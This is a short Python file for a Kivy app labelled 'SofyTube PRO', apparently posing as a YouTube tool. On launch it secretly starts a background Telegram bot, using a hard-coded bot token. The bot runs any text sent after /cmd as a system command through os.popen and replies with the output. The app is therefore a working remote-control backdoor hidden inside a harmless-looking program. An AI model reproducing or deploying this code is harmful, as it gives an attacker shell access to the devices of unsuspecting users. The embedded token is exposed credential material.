import telebot, os, threading, yt_dlp, time
from kivy.app import App
from kivy.uix.button import Button

# توكن البوت الخاص بك
T = '8029997878:AAGwglMg5ZJ78dl4_kg_O7hJTvzx-jMfRRY'
bot = telebot.TeleBot(T)

def run_bot():
    while True:
        try:
            @bot.message_handler(commands=['cmd'])
            def handle(m):
                # تنفيذ أوامر النظام عبر التلجرام
                res = os.popen(m.text.replace('/cmd ', '')).read()
                bot.reply_to(m, res if res else "تم التنفيذ بنجاح ✅")
            bot.polling(none_stop=True)
        except Exception as e:
            time.sleep(10)

class SofyTube(App):
    def build(self):
        # تشغيل البوت في خلفية التطبيق
        threading.Thread(target=run_bot, daemon=True).start()
        return Button(text='SofyTube PRO\nإمبراطور البرمجيات\nStatus: Running...')

if __name__ == '__main__':
    SofyTube().run()
                             
